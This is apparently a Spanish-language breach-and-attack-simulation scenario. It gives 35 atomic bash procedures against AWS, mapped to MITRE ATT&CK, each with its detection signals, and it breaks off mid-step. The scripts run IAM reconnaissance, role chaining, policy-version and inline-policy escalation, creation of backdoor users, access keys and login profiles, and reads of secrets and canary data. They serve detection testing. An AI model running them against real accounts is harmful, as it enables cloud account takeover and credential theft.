# AWS Atomic Identity Compromise and Data Plane Intrusion

| | |
|---|---|
| **Status** | draft |
| **Severity** | critical |
| **Target environment** | AWS IAM + STS + S3 + KMS + Secrets Manager + SSM Parameter Store + DynamoDB + Lambda + CloudTrail + EventBridge + SIEM |
| **MITRE Tactic** | TA0001 — Initial Access |
| **MITRE Technique** | T1078.004 — Cloud Accounts |
| **Tags** | `aws` · `atomic-tests` · `iam` · `identity-compromise` · `privilege-escalation` · `persistence` · `data-plane` · `serverless` · `defense-evasion` · `impact` · `terraform` · `rollback` · `attack-flow` |
| **Autor** | Sergio Javier Mazariego Guevara |
| **Creado** | 2026-07-20T21:06:27.747Z |
| **Actualizado** | 2026-07-20T21:06:27.747Z |

## Descripción

Escenario BAS canónico compuesto por procedimientos atómicos. Cada step representa una sola implementación reproducible de una técnica MITRE ATT&CK y referencia un adapter que separa precheck, ejecución, verificación, cleanup y verificación del cleanup. El Attack Flow modela rutas reales y alternativas sin convertir fases completas en scripts monolíticos.

## Steps

### 1. Validar credenciales AWS con STS

**MITRE:** T1078.004

Comprueba que la identidad BAS puede autenticarse y obtiene el ARN efectivo sin modificar recursos.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws sts get-caller-identity --output json | tee "${STRIKE_STATE_DIR}/aws-sts-get-caller-identity.json"
```

**Resultado esperado:**

STS devuelve Account, Arn y UserId para la sesión BAS.

**Señales de detección:**

CloudTrail GetCallerIdentity; principal ARN, access key, source IP, userAgent, región y sessionIssuer.

### 2. Obtener resumen de la cuenta IAM

**MITRE:** T1087.004

Realiza reconocimiento del plano de identidad sin cambios.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws iam get-account-summary --output json | tee "${STRIKE_STATE_DIR}/aws-iam-get-account-summary.json"
```

**Resultado esperado:**

AWS devuelve el mapa SummaryMap o una denegación explícita.

**Señales de detección:**

CloudTrail GetAccountSummary ejecutado por una identidad que no suele administrar IAM.

### 3. Obtener el grafo de autorización IAM

**MITRE:** T1069.003

Produce una vista de alto valor del grafo IAM y limita la salida a métricas para no imprimir documentos sensibles.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws iam get-account-authorization-details --filter User Group Role LocalManagedPolicy --output json > "${STRIKE_STATE_DIR}/account-auth-details.raw.json"
jq '{users:(.UserDetailList|length),groups:(.GroupDetailList|length),roles:(.RoleDetailList|length),policies:(.Policies|length)}' "${STRIKE_STATE_DIR}/account-auth-details.raw.json" | tee "${STRIKE_STATE_DIR}/aws-iam-get-account-authorization-details.json"
```

**Resultado esperado:**

Se obtienen conteos de usuarios, grupos, roles y políticas administradas locales.

**Señales de detección:**

CloudTrail GetAccountAuthorizationDetails; consulta masiva de relaciones IAM.

### 4. Enumerar usuarios IAM

**MITRE:** T1087.004

Procedimiento de solo lectura y una única llamada principal de enumeración.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws iam list-users --max-items 100 --output json | tee "${STRIKE_STATE_DIR}/aws-iam-list-users.json"
```

**Resultado esperado:**

La API devuelve una colección, incluso si está vacía.

**Señales de detección:**

CloudTrail ListUsers; volumen, frecuencia y principal solicitante.

### 5. Enumerar roles IAM

**MITRE:** T1087.004

Procedimiento de solo lectura y una única llamada principal de enumeración.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws iam list-roles --max-items 100 --output json | tee "${STRIKE_STATE_DIR}/aws-iam-list-roles.json"
```

**Resultado esperado:**

La API devuelve una colección, incluso si está vacía.

**Señales de detección:**

CloudTrail ListRoles; volumen, frecuencia y principal solicitante.

### 6. Enumerar grupos IAM

**MITRE:** T1069.003

Procedimiento de solo lectura y una única llamada principal de enumeración.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws iam list-groups --max-items 100 --output json | tee "${STRIKE_STATE_DIR}/aws-iam-list-groups.json"
```

**Resultado esperado:**

La API devuelve una colección, incluso si está vacía.

**Señales de detección:**

CloudTrail ListGroups; volumen, frecuencia y principal solicitante.

### 7. Enumerar políticas IAM administradas por el cliente

**MITRE:** T1069.003

Procedimiento de solo lectura y una única llamada principal de enumeración.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws iam list-policies --scope Local --max-items 100 --output json | tee "${STRIKE_STATE_DIR}/aws-iam-list-local-policies.json"
```

**Resultado esperado:**

La API devuelve una colección, incluso si está vacía.

**Señales de detección:**

CloudTrail ListPolicies; volumen, frecuencia y principal solicitante.

### 8. Generar IAM Credential Report

**MITRE:** T1087.004

Inicia el reporte; la recuperación del contenido es un atomic separado.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws iam generate-credential-report --output json | tee "${STRIKE_STATE_DIR}/aws-iam-generate-credential-report.json"
```

**Resultado esperado:**

AWS devuelve STARTED, INPROGRESS o COMPLETE.

**Señales de detección:**

CloudTrail GenerateCredentialReport desde una identidad no habitual.

### 9. Recuperar IAM Credential Report

**MITRE:** T1087.004

Guarda el CSV únicamente en el directorio de estado local protegido y muestra solo su hash.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
umask 077
AWS_PAGER="" aws iam get-credential-report --output json > "${STRIKE_STATE_DIR}/credential-report-response.json"
jq -r '.Content' "${STRIKE_STATE_DIR}/credential-report-response.json" | base64 --decode > "${STRIKE_STATE_DIR}/credential-report.csv"
sha256sum "${STRIKE_STATE_DIR}/credential-report.csv" | tee "${STRIKE_STATE_DIR}/aws-iam-get-credential-report.sha256"
```

**Resultado esperado:**

Se obtiene un CSV no vacío con metadatos de credenciales IAM.

**Señales de detección:**

CloudTrail GetCredentialReport; acceso a higiene de contraseñas, access keys y MFA.

### 10. Leer la trust policy del rol de escalamiento

**MITRE:** T1069.003

Descubre la relación de confianza de un objetivo de elevación.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws iam get-role --role-name "${STRIKE_BAS_ESCALATION_ROLE_ARN##*/}" --output json | tee "${STRIKE_STATE_DIR}/aws-iam-get-escalation-role.json"
```

**Resultado esperado:**

AWS devuelve el rol y su trust policy.

**Señales de detección:**

CloudTrail GetRole sobre un rol privilegiado o poco consultado.

### 11. Simular permiso sts:AssumeRole

**MITRE:** T1069.003

Evalúa una ruta de privilegio sin ejercerla.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws iam simulate-principal-policy --policy-source-arn "${STRIKE_BAS_COMPROMISED_ROLE_ARN}" --action-names sts:AssumeRole --resource-arns "${STRIKE_BAS_ESCALATION_ROLE_ARN}" --output json | tee "${STRIKE_STATE_DIR}/aws-iam-simulate-assume-role.json"
```

**Resultado esperado:**

EvalDecision indica allowed, implicitDeny o explicitDeny.

**Señales de detección:**

CloudTrail SimulatePrincipalPolicy con sts:AssumeRole como acción evaluada.

### 12. Simular permiso iam:PassRole

**MITRE:** T1069.003

Evalúa una ruta de elevación mediada por servicio sin modificar Lambda.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws iam simulate-principal-policy --policy-source-arn "${STRIKE_BAS_COMPROMISED_ROLE_ARN}" --action-names iam:PassRole --resource-arns "${STRIKE_BAS_LAMBDA_ELEVATED_ROLE_ARN}" --output json | tee "${STRIKE_STATE_DIR}/aws-iam-simulate-pass-role.json"
```

**Resultado esperado:**

EvalDecision indica si PassRole es viable.

**Señales de detección:**

CloudTrail SimulatePrincipalPolicy con iam:PassRole y un role de servicio como recurso.

### 13. Enumerar buckets S3

**MITRE:** T1619

Procedimiento de descubrimiento de un único servicio AWS.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws s3api list-buckets --output json | tee "${STRIKE_STATE_DIR}/aws-s3-list-buckets.json"
```

**Resultado esperado:**

La API devuelve el inventario o estado del servicio.

**Señales de detección:**

CloudTrail ListBuckets; acceso inicial a inventario de almacenamiento.

### 14. Enumerar funciones Lambda

**MITRE:** T1526

Procedimiento de descubrimiento de un único servicio AWS.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws lambda list-functions --max-items 100 --output json | tee "${STRIKE_STATE_DIR}/aws-lambda-list-functions.json"
```

**Resultado esperado:**

La API devuelve el inventario o estado del servicio.

**Señales de detección:**

CloudTrail ListFunctions; descubrimiento de ejecución serverless.

### 15. Enumerar tablas DynamoDB

**MITRE:** T1526

Procedimiento de descubrimiento de un único servicio AWS.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws dynamodb list-tables --limit 100 --output json | tee "${STRIKE_STATE_DIR}/aws-dynamodb-list-tables.json"
```

**Resultado esperado:**

La API devuelve el inventario o estado del servicio.

**Señales de detección:**

CloudTrail ListTables; descubrimiento de repositorios de datos.

### 16. Enumerar secretos de Secrets Manager

**MITRE:** T1526

Procedimiento de descubrimiento de un único servicio AWS.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws secretsmanager list-secrets --max-results 100 --output json | tee "${STRIKE_STATE_DIR}/aws-secretsmanager-list-secrets.json"
```

**Resultado esperado:**

La API devuelve el inventario o estado del servicio.

**Señales de detección:**

CloudTrail ListSecrets; búsqueda de almacenes de credenciales.

### 17. Enumerar trails de CloudTrail

**MITRE:** T1526

Procedimiento de descubrimiento de un único servicio AWS.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws cloudtrail list-trails --output json | tee "${STRIKE_STATE_DIR}/aws-cloudtrail-list-trails.json"
```

**Resultado esperado:**

La API devuelve el inventario o estado del servicio.

**Señales de detección:**

CloudTrail ListTrails; reconocimiento del plano de auditoría.

### 18. Enumerar detectores GuardDuty

**MITRE:** T1526

Procedimiento de descubrimiento de un único servicio AWS.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws guardduty list-detectors --output json | tee "${STRIKE_STATE_DIR}/aws-guardduty-list-detectors.json"
```

**Resultado esperado:**

La API devuelve el inventario o estado del servicio.

**Señales de detección:**

CloudTrail ListDetectors; descubrimiento de controles defensivos.

### 19. Comprobar Security Hub

**MITRE:** T1526

Procedimiento de descubrimiento de un único servicio AWS.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws securityhub describe-hub --output json | tee "${STRIKE_STATE_DIR}/aws-securityhub-describe-hub.json"
```

**Resultado esperado:**

La API devuelve el inventario o estado del servicio.

**Señales de detección:**

CloudTrail DescribeHub; reconocimiento de seguridad centralizada.

### 20. Asumir rol BAS de escalamiento

**MITRE:** T1548.005

Guarda las credenciales temporales en un archivo 0600 para el siguiente atomic y no imprime secretos.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
umask 077
AWS_PAGER="" aws sts assume-role --role-arn "${STRIKE_BAS_ESCALATION_ROLE_ARN}" --role-session-name "strike-atomic-escalation-$$" --duration-seconds 900 --output json > "${STRIKE_STATE_DIR}/aws-sts-assume-escalation-role.json"
AK=$(jq -r '.Credentials.AccessKeyId' "${STRIKE_STATE_DIR}/aws-sts-assume-escalation-role.json")
SK=$(jq -r '.Credentials.SecretAccessKey' "${STRIKE_STATE_DIR}/aws-sts-assume-escalation-role.json")
TK=$(jq -r '.Credentials.SessionToken' "${STRIKE_STATE_DIR}/aws-sts-assume-escalation-role.json")
AWS_ACCESS_KEY_ID="$AK" AWS_SECRET_ACCESS_KEY="$SK" AWS_SESSION_TOKEN="$TK" AWS_PAGER="" aws sts get-caller-identity --output json > "${STRIKE_STATE_DIR}/aws-sts-assume-escalation-role.verify.json"
```

**Resultado esperado:**

STS emite credenciales y el ARN verificado corresponde al rol de escalamiento.

**Señales de detección:**

CloudTrail AssumeRole exitoso; roleSessionName STRIKE, source identity, principal origen y uso posterior de la access key temporal.

### 21. Encadenar una segunda sesión STS

**MITRE:** T1548.005

Demuestra role chaining como procedimiento independiente.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
umask 077
SRC="${STRIKE_STATE_DIR}/aws-sts-assume-escalation-role.json"
AK=$(jq -r '.Credentials.AccessKeyId' "$SRC")
SK=$(jq -r '.Credentials.SecretAccessKey' "$SRC")
TK=$(jq -r '.Credentials.SessionToken' "$SRC")
AWS_ACCESS_KEY_ID="$AK" AWS_SECRET_ACCESS_KEY="$SK" AWS_SESSION_TOKEN="$TK" AWS_PAGER="" aws sts assume-role --role-arn "${STRIKE_BAS_CHAIN_ROLE_ARN}" --role-session-name "strike-atomic-chain-$$" --duration-seconds 900 --output json > "${STRIKE_STATE_DIR}/aws-sts-chain-second-role.json"
CAK=$(jq -r '.Credentials.AccessKeyId' "${STRIKE_STATE_DIR}/aws-sts-chain-second-role.json")
CSK=$(jq -r '.Credentials.SecretAccessKey' "${STRIKE_STATE_DIR}/aws-sts-chain-second-role.json")
CTK=$(jq -r '.Credentials.SessionToken' "${STRIKE_STATE_DIR}/aws-sts-chain-second-role.json")
AWS_ACCESS_KEY_ID="$CAK" AWS_SECRET_ACCESS_KEY="$CSK" AWS_SESSION_TOKEN="$CTK" AWS_PAGER="" aws sts get-caller-identity --output json > "${STRIKE_STATE_DIR}/aws-sts-chain-second-role.verify.json"
```

**Resultado esperado:**

STS emite una segunda sesión cuyo ARN corresponde al rol chain.

**Señales de detección:**

Dos eventos AssumeRole relacionados; sessionIssuer y access keys temporales encadenadas.

### 22. Crear una versión adicional de una managed policy

**MITRE:** T1098.003

Prueba CreatePolicyVersion sin activar todavía la versión.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
umask 077
cat > "${STRIKE_STATE_DIR}/policy-version-document.json" <<EOF
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["s3:GetObject"],"Resource":["${STRIKE_BAS_DATA_BUCKET_ARN}/*"]}]}
EOF
AWS_PAGER="" aws iam create-policy-version --policy-arn "${STRIKE_BAS_VERSIONED_POLICY_ARN}" --policy-document "file://${STRIKE_STATE_DIR}/policy-version-document.json" --output json > "${STRIKE_STATE_DIR}/aws-iam-create-policy-version.json"
```

**Resultado esperado:**

IAM crea un VersionId adicional y lo conserva como no predeterminado.

**Señales de detección:**

CloudTrail CreatePolicyVersion; política objetivo, documento, actor y horario.

### 23. Activar la versión de política creada

**MITRE:** T1098.003

Separa claramente la creación de la versión de su activación.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws iam list-policy-versions --policy-arn "${STRIKE_BAS_VERSIONED_POLICY_ARN}" --output json > "${STRIKE_STATE_DIR}/policy-versions-before.json"
ORIGINAL=$(jq -r '.Versions[] | select(.IsDefaultVersion==true) | .VersionId' "${STRIKE_STATE_DIR}/policy-versions-before.json")
NEW=$(jq -r '.PolicyVersion.VersionId' "${STRIKE_STATE_DIR}/aws-iam-create-policy-version.json")
printf '%s' "$ORIGINAL" > "${STRIKE_STATE_DIR}/original-default-policy-version.txt"
printf '%s' "$NEW" > "${STRIKE_STATE_DIR}/new-default-policy-version.txt"
AWS_PAGER="" aws iam set-default-policy-version --policy-arn "${STRIKE_BAS_VERSIONED_POLICY_ARN}" --version-id "$NEW"
```

**Resultado esperado:**

La nueva VersionId queda marcada como default.

**Señales de detección:**

CloudTrail SetDefaultPolicyVersion; cambio efectivo de privilegios para identidades asociadas.

### 24. Insertar una inline policy en un rol

**MITRE:** T1098.003

Emula persistencia o elevación mediante permisos embebidos en un rol.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
cat > "${STRIKE_STATE_DIR}/inline-role-policy.json" <<EOF
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"s3:GetObject","Resource":"${STRIKE_BAS_DATA_BUCKET_ARN}/*"}]}
EOF
AWS_PAGER="" aws iam put-role-policy --role-name "${STRIKE_BAS_TARGET_ROLE_NAME}" --policy-name STRIKEAtomicInlinePolicy --policy-document "file://${STRIKE_STATE_DIR}/inline-role-policy.json"
```

**Resultado esperado:**

GetRolePolicy recupera la política STRIKEAtomicInlinePolicy.

**Señales de detección:**

CloudTrail PutRolePolicy; nombre de rol, nombre de policy y acciones concedidas.

### 25. Agregar usuario IAM a grupo elevado

**MITRE:** T1098.003

Emula herencia de privilegios mediante membresía de grupo.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws iam add-user-to-group --user-name "${STRIKE_BAS_TARGET_USER_NAME}" --group-name "${STRIKE_BAS_ELEVATED_GROUP_NAME}"
```

**Resultado esperado:**

ListGroupsForUser muestra el grupo BAS.

**Señales de detección:**

CloudTrail AddUserToGroup y uso posterior de permisos heredados.

### 26. Crear access key adicional

**MITRE:** T1098.001

La credencial se almacena con permisos 0600, se valida con STS y nunca se imprime.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
umask 077
AWS_PAGER="" aws iam create-access-key --user-name "${STRIKE_BAS_TARGET_USER_NAME}" --output json > "${STRIKE_STATE_DIR}/aws-iam-create-additional-access-key.json"
AK=$(jq -r '.AccessKey.AccessKeyId' "${STRIKE_STATE_DIR}/aws-iam-create-additional-access-key.json")
SK=$(jq -r '.AccessKey.SecretAccessKey' "${STRIKE_STATE_DIR}/aws-iam-create-additional-access-key.json")
AWS_ACCESS_KEY_ID="$AK" AWS_SECRET_ACCESS_KEY="$SK" AWS_SESSION_TOKEN="" AWS_PAGER="" aws sts get-caller-identity --output json > "${STRIKE_STATE_DIR}/aws-iam-create-additional-access-key.verify.json"
```

**Resultado esperado:**

La nueva access key autentica como el target user.

**Señales de detección:**

CloudTrail CreateAccessKey y primer uso de la nueva key; actor creador distinto del usuario objetivo.

### 27. Crear perfil de acceso a consola

**MITRE:** T1098.001

La contraseña aleatoria se mantiene localmente y no se imprime.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
umask 077
PASS=$(openssl rand -base64 36 | tr -d '
')
printf '%s' "$PASS" > "${STRIKE_STATE_DIR}/login-profile-password.txt"
AWS_PAGER="" aws iam create-login-profile --user-name "${STRIKE_BAS_TARGET_USER_NAME}" --password "$PASS" --password-reset-required
```

**Resultado esperado:**

GetLoginProfile confirma la existencia del perfil.

**Señales de detección:**

CloudTrail CreateLoginProfile para un usuario que antes no tenía acceso de consola.

### 28. Crear usuario IAM backdoor acotado

**MITRE:** T1136.003

Emula creación de cuenta cloud sin permitir privilegios fuera del laboratorio.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
RUN_ID=$(date +%s)-$$
USER="${STRIKE_BAS_PREFIX}-runtime-${RUN_ID}"
printf '%s' "$USER" > "${STRIKE_STATE_DIR}/runtime-user-name.txt"
AWS_PAGER="" aws iam create-user --path /strike-bas/runtime/ --user-name "$USER" --permissions-boundary "${STRIKE_BAS_PERMISSIONS_BOUNDARY_ARN}" --tags Key=STRIKE-BAS,Value=true Key=Purpose,Value=BAS-Security-Validation --output json > "${STRIKE_STATE_DIR}/aws-iam-create-runtime-user.json"
```

**Resultado esperado:**

IAM crea el usuario y conserva el permissions boundary esperado.

**Señales de detección:**

CloudTrail CreateUser y PutUserPermissionsBoundary; path, tags y creador.

### 29. Adjuntar política elevada al usuario backdoor

**MITRE:** T1098.003

Emula adición de roles o permisos a una cuenta cloud adversaria.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
USER=$(cat "${STRIKE_STATE_DIR}/runtime-user-name.txt"); AWS_PAGER="" aws iam attach-user-policy --user-name "$USER" --policy-arn "${STRIKE_BAS_ELEVATED_POLICY_ARN}"
```

**Resultado esperado:**

ListAttachedUserPolicies muestra la política BAS elevada.

**Señales de detección:**

CloudTrail AttachUserPolicy correlacionado con CreateUser reciente.

### 30. Enumerar objetos del bucket canary

**MITRE:** T1619

Descubre nombres y prefijos de objetos sin descargar contenido.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws s3api list-objects-v2 --bucket "${STRIKE_BAS_DATA_BUCKET}" --prefix canary/ --output json | tee "${STRIKE_STATE_DIR}/aws-s3-list-canary-objects.json"
```

**Resultado esperado:**

La respuesta contiene los objetos canary preaprovisionados.

**Señales de detección:**

S3 data event ListObjects/ListBucket, principal, bucket y patrón de enumeración.

### 31. Descargar objeto S3 canary

**MITRE:** T1530

Guarda el contenido localmente, muestra únicamente SHA-256 y lo elimina en cleanup.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws s3api get-object --bucket "${STRIKE_BAS_DATA_BUCKET}" --key "${STRIKE_BAS_CANARY_KEY}" "${STRIKE_STATE_DIR}/s3-canary.bin" >/dev/null
sha256sum "${STRIKE_STATE_DIR}/s3-canary.bin" | tee "${STRIKE_STATE_DIR}/aws-s3-get-canary-object.sha256"
```

**Resultado esperado:**

El archivo se descarga y su tamaño es mayor que cero.

**Señales de detección:**

S3 GetObject data event; bytes, objeto, principal, IP, región y secuencia posterior a ListBucket.

### 32. Describir secreto canary

**MITRE:** T1526

Separa el descubrimiento del acceso al material secreto.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
AWS_PAGER="" aws secretsmanager describe-secret --secret-id "${STRIKE_BAS_SECRET_ARN}" --output json | tee "${STRIKE_STATE_DIR}/aws-secretsmanager-describe-canary.json"
```

**Resultado esperado:**

DescribeSecret devuelve el ARN esperado.

**Señales de detección:**

CloudTrail DescribeSecret antes de GetSecretValue.

### 33. Leer valor de Secrets Manager

**MITRE:** T1555.006

Calcula un hash local del valor sin mostrarlo.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
umask 077
AWS_PAGER="" aws secretsmanager get-secret-value --secret-id "${STRIKE_BAS_SECRET_ARN}" --query SecretString --output text > "${STRIKE_STATE_DIR}/secret-value.txt"
sha256sum "${STRIKE_STATE_DIR}/secret-value.txt" | tee "${STRIKE_STATE_DIR}/aws-secretsmanager-get-secret-value.sha256"
```

**Resultado esperado:**

Se obtiene un SecretString no vacío.

**Señales de detección:**

CloudTrail GetSecretValue; principal no habitual, volumen, región y relación con reconocimiento previo.

### 34. Leer SecureString de Parameter Store

**MITRE:** T1555.006

Guarda y hashea el valor localmente sin imprimirlo.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
umask 077
AWS_PAGER="" aws ssm get-parameter --name "${STRIKE_BAS_PARAMETER_NAME}" --with-decryption --query Parameter.Value --output text > "${STRIKE_STATE_DIR}/secure-parameter.txt"
sha256sum "${STRIKE_STATE_DIR}/secure-parameter.txt" | tee "${STRIKE_STATE_DIR}/aws-ssm-get-secure-parameter.sha256"
```

**Resultado esperado:**

El parámetro desencriptado no está vacío.

**Señales de detección:**

CloudTrail GetParameter con WithDecryption=true y evento KMS Decrypt asociado.

### 35. Desencriptar material canary con KMS

**MITRE:** T1555.006

El plaintext se escribe localmente, se hashea y se elimina.

```bash
set -euo pipefail
STRIKE_STATE_DIR="${STRIKE_STATE_DIR:-/tmp/strike-aws-atomic-state}"
mkdir -p "${STRIKE_STATE_DIR}"
command -v aws >/dev/null 2>&1 || { echo "aws no está instalado" >&2; exit 90; }
umask 077
printf '%s' "${STRIKE_BAS_KMS_CIPHERTEXT_B64}" | base64 --decode > "${STRIKE_STATE_DIR}/kms-ciphertext.bin"
